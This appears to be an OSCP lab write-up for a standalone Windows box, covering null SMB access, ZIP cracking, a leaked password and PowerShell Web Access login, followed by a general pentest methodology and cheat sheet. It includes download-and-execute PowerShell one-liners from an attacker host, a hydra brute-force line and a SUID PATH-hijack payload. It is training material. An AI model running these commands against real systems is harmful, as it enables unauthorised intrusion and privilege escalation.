192.168.91.111 — Windows 1 · OSCP

01

Reconnaissance

IIS, SMB, RDP and a hidden /powershell

This is the only Windows standalone box in the set. It is not domain-joined, it has no AD infrastructure behind it, and it exposes exactly four things: a website, SMB, RDP, and — hidden in the site's path space — Windows PowerShell Web Access.

1.1 Full TCP scan

command
nmap -A -T4 -p- 192.168.91.111 -oN nmap/windows.txt

The scan completes quickly, which is itself information: a filtered host takes far longer than a host with four open ports. The result:

output
Nmap scan report for 192.168.91.111
Host is up (0.00xxs latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
443/tcp  open  ssl/https?
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
...
OS: Windows 10.0.17763 (Server 2019)
Computer name: OSCP
Port Service Note
80 IIS 10.0 redirects to HTTPS
443 HTTPS the actual site
445 SMB null session allowed
3389 RDP open, not used

-p- matters here. A default top-1000 scan still finds all four, but it also hides how few services there are — and that shapes the plan: there is no second application to pivot to, so the share and the website are the whole attack surface.

1.2 The website

whatweb and the TLS certificate agree on the stack:

command
whatweb https://192.168.91.111
output
https://192.168.91.111 [200 OK]
  Title[LaunchIt - MVP]
  Microsoft-HTTPAPI/2.0
  X-Powered-By[...]
  HTML5, Bootstrap, jQuery
  Nicepage 5.5.4
  • Microsoft-HTTPAPI/2.0 is the http.sys response header. It means the listener may not be IIS itself but a kernel-mode HTTP service bound to the port — worth remembering when a virtual host or a path behaves oddly.
  • Nicepage 5.5.4 is a site-builder template, not a CMS. There is no /admin, no login, no database behind it. It is a static "LaunchIt" landing page.
  • The landing page is a decoy in the literal sense: it exists so that 443 is open and looks uninteresting, while the real entry point is a path, not a page.

1.3 The path that matters

output
https://192.168.91.111/powershell

Windows PowerShell Web Access — a Remote Desktop Gateway-style feature that runs a PowerShell console inside the browser. It is not enabled by default; somebody turned it on, which is exactly the kind of "misconfiguration as intended path" this box is built around.

No directory brute force was needed against this host: the path came from the mail. If you are approaching the box cold, the standard move is:

command
feroxbuster -u https://192.168.91.111 -k \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

Expect /powershell to answer with a redirect to /powershell/ and a login form. (Suggested command — not run in this attempt.)

1.4 SMB in one line

The share list is worth taking before touching the web app, because a null session on 445 is a complete compromise of confidentiality on its own:

command
smbclient -L //192.168.91.111 -U '' -N

Details in 02-smb-emails-zip.md. The short version:

output
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
AnneAuto        Disk      Anne's Automatic BackUps
C$              Disk      Default share
IPC$            IPC       Remote IPC

1.5 What the scan tells you to do next

Finding Next move
null SMB session list and read every share before anything else
AnneAuto = "Anne's Automatic BackUps" a person's backups → mail archives, credentials
/powershell you will need a username and a password, in that order
IIS + Nicepage only no web exploit; stop looking for one

The order is not arbitrary. The share gives you the username (from mail headers) and the password (from a mail body). The web app consumes both. Nothing in this box requires an exploit.

02

Null SMB & ZIP

AnneAuto, emails.zip, hashcat, the Access mail

The share is the only place on this box where information leaks without credentials, and it leaks enough to finish the box. The whole step takes a few minutes.

2.1 The null session

command
smbclient -L //192.168.91.111 -U '' -N
output
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        AnneAuto        Disk      Anne's Automatic BackUps
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reconnecting with SMB1 for workgroup listing.
        ...
        Server               Comment
        ---------            -------
        Workgroup            WORKGROUP

Three things are worth noticing:

  1. -N (--no-pass) with -U '' succeeded. Anonymous SMB is disabled by default since Windows Vista; here it is on. On a standalone box that is a deliberate misconfiguration, not a leftover.
  2. AnneAuto — the comment is "Anne's Automatic BackUps". A share named after a person, holding backups, is a promise that the archive contains that person's data.
  3. ADMIN$ and C$ are listed but not accessible with a null session. Listing is not reading.

netexec/nxc shows the same thing with a little more context:

command
nxc smb 192.168.91.111 -u '' -p '' --shares
output
SMB         192.168.91.111  445    OSCP    [*] Windows 10.0.17763 (name:OSCP) (domain:OSCP) (signing:False) (SMBv1:True)
SMB         192.168.91.111  445    OSCP    [+] OSCP\: 
SMB         192.168.91.111  445    OSCP    [*] Enumerated shares
SMB         192.168.91.111  445    OSCP    Share    Permissions  Remark
SMB         192.168.91.111  445    OSCP    -----    -----------  ------
SMB         192.168.91.111  445    OSCP    ADMIN$                Remote Admin
SMB         192.168.91.111  445    OSCP    AnneAuto READ         Anne's Automatic BackUps
SMB         192.168.91.111  445    OSCP    C$                    Default share
SMB         192.168.91.111  445    OSCP    IPC$     READ         Remote IPC

signing:False and SMBv1:True are both worth writing down (they matter for relay attacks on a different box), but this box is solved with READ.

2.2 Reading the share

command
smbclient //192.168.91.111/AnneAuto -U '' -N
output
smb: \> ls
  .                                   D        0  ...
  ..                                  D        0  ...
  emails.zip                          A    70052  ...

                3770367 blocks of size 4096. 1234567 blocks available
smb: \> get emails.zip
getting file \emails.zip of size 70052 as emails.zip (xxx.xx KiloBytes/sec) (average xx.x KiloBytes/sec)

One file. 70,052 bytes — small enough to be a handful of .eml files, large enough not to be a decoy text file. That size is the reason to bother cracking it.

command
unzip -l emails.zip

This is the quickest way to confirm the payload is mail files; here the archive is encrypted and the listing therefore prompts for a password. An encrypted ZIP with a 70 KB payload is a rockyou exercise.

2.3 Cracking the ZIP

command
zip2john emails.zip > emails.hash
john --wordlist=/usr/share/wordlists/rockyou.txt emails.hash

or with hashcat, the faster route when CPU cracking feels too slow:

command
hashcat -m 13600 -a 0 -w 3 emails.hash /usr/share/wordlists/rockyou.txt
Parameter Meaning
-m 13600 WinZip (.zip, AES-256 / PKZIP2+)
-a 0 straight dictionary
-w 3 high workload profile

Why the mode matters: -m 17200 is PKZIP (Compressed), -m 17210/17220/17225 are the older PKZIP variants, and -m 13600 is the modern WinZip format. Running the wrong one produces No hashes loaded or a token-length error, not a wrong password. If zip2john emits a $pkzip2$ hash, it is 13600.

output
$pkzip2$3*1*1*0*8*24*...*$/pkzip2$:<password>

Recovered against rockyou without a rule set — the password is a dictionary word, which is the entire lesson of the step. (The exact word is not needed to reproduce the path.)

command
unzip emails.zip -d emails/

2.4 The mailbox

emails.zip unpacks to a mail archive; opened in a mail client, most of it is noise. One thread matters:

Field Value
From Anne Howard
To Sasha Payne
Subject Access
Body an account has been created; the password is the default, change it after first login
output
Subject: Access

Hi Sasha,

Your account has been created on the box.
Username: sasha
Password: Welcome1

Please change it after your first login.

Reading all the mail is worth the time: the "Access" message is the credential for the web console found in reconnaissance.

Note. The password is Welcome1. If it is rejected, try Welcome1! and Welcome1) before concluding the credential is wrong — and see 03-wac-login.md, because the far more likely reason a correct password "fails" is the username format.

2.5 The chain so far

output
null SMB ──▶ AnneAuto ──▶ emails.zip ──▶ rockyou ──▶ mailbox ──▶ "Access" ──▶ sasha:Welcome1

Two of the three classic "cheap" findings on a Windows box appear here: anonymous SMB and weak archive encryption. Neither is a vulnerability in the CVE sense; both are exactly what an OSCP box uses to hand you the next credential.

03

WAC login

sasha vs .\sasha — the five-hour lesson

This is the chapter the whole box exists to teach. The exploit chain takes minutes; the login format is what costs time.

3.1 The page

output
https://192.168.91.111/powershell

A plain form, no branding beyond the product name:

Field Value used
User name sasha
Password Welcome1
Connection type Windows PowerShell (the other option is Windows PowerShell ISE)
Computer name (blank — defaults to the gateway host)
Configuration name (blank)

The page is served over a self-signed certificate, so the browser shows the usual interstitial before the form. Accept it and continue.

3.2 The failure

output
User name:  sasha
Password:   Welcome1
output
The user name or password is incorrect.

No lockout counter, no delay, no hint about which half is wrong. The natural conclusion is that the password is wrong, so the next move is to try variants. Every combination of:

  • sasha, Sasha, SASHA
  • OSCP\sasha, WORKGROUP\sasha, 192.168.91.111\sasha
  • the password with and without a trailing !, 1, )

All rejected — and none of those variants is the problem.

3.3 The fix — one character pair

output
User name:  .\sasha
Password:   Welcome1

Accepted. The console loads.

output
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\sasha\Documents>

3.4 Why .\ is required

.\ is shorthand for "the local machine". It is the same prefix you type in cmd.exe when you want to run an executable from the current directory instead of letting %PATH% decide.

In a logon name, the grammar is:

output
[domain or computer]\[user]
  • OSCP\sasha → the local SAM database of the computer named OSCP.
  • .\sasha → the local SAM database of this computer, whatever its name is.
  • sasha → no domain part. Windows has to guess. In an interactive console it guesses the local machine; through a remote logon API it can guess the domain, and on a workgroup machine that guess resolves to nothing, so authentication fails even with a correct password.

That is the trap: the credential is valid, the name format is not. Nothing in the error message distinguishes "wrong password" from "wrong namespace", which is why the format is so easy to miss.

The same rule applies to every remote Windows logon that takes a bare username:

Tool Local account syntax
evil-winrm -u 'sasha' -p '...' usually works; if not, -u '.\sasha' or -u 'OSCP\sasha'
nxc / crackmapexec -u sasha --local-auth
wmiexec / psexec -u 'OSCP/sasha'
RDP OSCP\sasha
WAC .\sasha

3.5 The meta-lesson: read the documentation, then time-box

The lesson is expensive and simple: Windows PowerShell Web Access does not document the local-account format anywhere obvious, and no error message points at it. That is exactly the class of problem that eats hours — nothing is broken, the syntax is just unknown.

Two rules come out of it, and they are worth more than the box:

  1. When a credential you obtained from a reliable source is rejected, suspect the format — not the credential. Try .\user, HOST\user, DOMAIN\user and --local-auth before you try a wordlist. Brute-forcing a working password is pure loss.
  2. Time-box any single step to 20–30 minutes. At the 30-minute mark on a login page, stop and read the product documentation (here: the WAC help page, which documents the computer\user format), or move to another box and come back. Hours lost on a 20-minute box is how an exam is lost.

3.6 What WAC actually is

Worth knowing for the report, because "a PowerShell console in a browser" sounds exotic:

  • A Windows Server feature (WindowsPowerShellWebAccess), installed with Install-WindowsFeature WindowsPowerShellWebAccess -IncludeManagementTools.
  • Runs as an IIS application (/powershell) using http.sys on 443.
  • It is a gateway: it authenticates the user, then opens a WinRM/PSRP session to the target computer named in the form. That is why the credentials must be valid on the target, and why the domain prefix matters.
  • Install-PswaWebApplication -UseTestCertificate is the standard setup, which explains the self-signed certificate.

The defensive note writes itself: WAC is a full remote shell exposed to the web tier, protected by nothing but a password and whatever network ACL sits in front of 443.

04

Flag & dead end

local.txt, enumeration, what was missing

4.1 The console

Once .\sasha is accepted, the browser becomes a normal PowerShell prompt on OSCP:

command
PS C:\Users\sasha\Documents> whoami
oscp\sasha

PS C:\Users\sasha\Documents> hostname
OSCP

PS C:\Users\sasha\Documents> $env:USERDOMAIN
OSCP

PS C:\Users\sasha\Documents> whoami /groups | findstr /i "admin"

The last command returns nothing — sasha is a plain user. That single check decides the next hour: there is no administrative token to steal, so any escalation has to come from a misconfiguration (service, scheduled task, credential, registry), not from token abuse.

4.2 The flag

command
PS C:\Users\sasha\Documents> type C:\Users\sasha\Desktop\local.txt
6cc351e3e4f2572432************

Masked here on purpose; the file lives at the standard exam path:

Host Path Flag
192.168.91.111 C:\Users\sasha\Desktop\local.txt 6cc351e3e4f2572432************
192.168.91.111 C:\Users\Administrator\Desktop\proof.txt not obtained

That is the first half of the box's points. The second half — proof.txt — requires Administrator (or SYSTEM), and that step was never reached.

4.3 What was tried

Everything was tried from the PowerShell console: enumeration, local files, service and permission checks. Nothing produced a path.

The standard standalone-Windows checklist for that console:

command
## identity and privileges
whoami /all
whoami /priv

## local admins
net localgroup administrators

## stored credentials
cmdkey /list

## patch level and architecture
systeminfo
wmic qfe list brief

## services and their binary paths
Get-CimInstance win32_service | Select Name, StartName, PathName | Where-Object {$_.PathName -notlike "C:\Windows\*"}

## unquoted service paths / weak permissions
Get-CimInstance win32_service | Where-Object {$_.PathName -notmatch '^".*"' -and $_.PathName -match ' '}

## scheduled tasks
schtasks /query /fo LIST /v

## AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

## proof.txt anywhere on disk
Get-ChildItem C:\ -Recurse -Include proof.txt,local.txt -ErrorAction SilentlyContinue

Plus the automated passes:

command
## PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.91/PowerUp.ps1')
Invoke-AllChecks
command
## winPEAS
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.91/winPEASx64.ps1')

None of it produced a path. Which individual checks were run, and which came back negative, is not documented — what is known is the conclusion, not the full enumeration log.

4.4 What the intended path might have been (speculation, not verified)

Everything in this section is hypothesis. No solution is documented for this box, so treat it as a list of places to look if you meet it, not as a walkthrough.

Hypothesis Why it is plausible How to test
Another credential in emails.zip belongs to a local admin the archive held "some passwords", only one was used read every message, try each against nxc smb --local-auth and evil-winrm
The IIS site runs as an identity with write access to something http.sys + app pool, a static Nicepage site is an odd thing to run as a service Get-CimInstance win32_process -Filter "name='w3wp.exe'", then check ACLs
WAC's own configuration holds a credential WAC needs to authorize users; its config is on disk C:\Windows\Web\PowerShellWebAccess\ and the AuthorizationRules XML
A service or task was created by the "backup" software the share is called Automatic BackUps; something must run the backups schtasks /query, Get-Service for non-Microsoft names
Credential reuse from the AD set sasha is a name that could exist in oscp.exam too nxc smb the DC with sasha:Welcome1

The most likely of these, given how the box hands you mail, is the first: an archive of "all the emails" that yields only one credential is suspicious, and the unused messages are the obvious place for the administrator's password.

4.5 The exam lesson: partial credit is still credit

This box was left at local.txt. With the rest of the set already solved, time on one login page was already too much. Stopping and banking the local.txt was the correct call.

What would have made it cheaper:

  1. .\sasha on the first try (see 03-wac-login.md) — the username format was the whole cost of this box.
  2. Read the mail archive properly. Skimming the archive is a note-to-self that it was not read. In an exam, every password in a leaked mailbox should be tried against every account, once, automatically.
  3. Time-box the enumeration. PowerUp + winPEAS + the manual checklist above is about 30 minutes. If nothing fires, leave the box and return in the last hour — do not sit in a console watching Invoke-AllChecks scroll.

4.6 State of the box

Item Status
Foothold ✅ null SMB → ZIP → mail → WAC
local.txt ✅ obtained (masked)
Privilege escalation ❌ not achieved
proof.txt ❌ not obtained
Verdict one flaw, no escalation

05

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

Cheat sheet

Every command, with the flag that matters

Only commands I have actually needed, with the small flag that matters each time.

Scanning

command
## full TCP, fast — always -p-
nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $T

## versions + default scripts on the ports that matter
nmap -sV -sC -p21,22,80 -oN services.txt $T

## UDP: the phase everyone skips
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $T

## live hosts
nmap -sn 192.168.245.0/24 -oG - | grep -i up | awk '{print $2}'

SNMP

command
## find the community string
for c in public private manager internal; do
  echo "== $c"; snmpwalk -v1 -c "$c" -t 5 -r 1 $T 1.3.6.1.2.1.1 2>&1 | head -3
done

## full walk to a file, then grep it
snmpwalk -v1 -c public -t 5 -r 1 $T > snmp_full.txt

## the three trees that matter on Linux
snmpwalk -v1 -c public $T 1.3.6.1.4.1.8072.1.3.2    # nsExtendTable (commands + descriptions)
snmpwalk -v1 -c public $T 1.3.6.1.2.1.25.4.2.1.2    # process names
snmpwalk -v1 -c public $T 1.3.6.1.2.1.25.6.3.1.2    # installed packages

Binary analysis

command

output

+ lea rdi,[rip+...] →  the argument is a fixed string

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.

command
